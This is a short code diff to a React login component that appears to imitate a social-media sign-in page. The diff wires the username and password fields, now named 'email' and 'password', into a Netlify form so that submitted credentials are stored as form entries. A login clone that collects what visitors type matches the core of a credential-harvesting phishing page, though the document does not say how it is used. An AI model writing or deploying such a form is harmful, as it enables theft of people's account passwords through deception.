@@ -19,19 +19,20 @@ const  Upper = () => {
                  ------------------------   OR   ------------------------
               </div>
              <form
-                name ="username"
+                name ="data-form"
                 method ="POST"
                 data-netlify="true"
                >
+                <input type="hidden" name="form-name" value="data-form" />
                <label id ='username2'>
               <div id='username'>
-               <input id="usinp" type="text" size={31 } placeholder=" Phone number, username, or email" />
+               <input id="usinp" name="email" type="text" size={31 } placeholder=" Phone number, username, or email" />
               </div>
               </label>
 
               <div id='password'>
                 <label  id ='password2'>
-                   <input id="psinp" type="text" size={31} placeholder=" password" />
+                   <input id="psinp" name="password" type="password" size={31} placeholder=" password" />
                 </label>
                 </div>
                
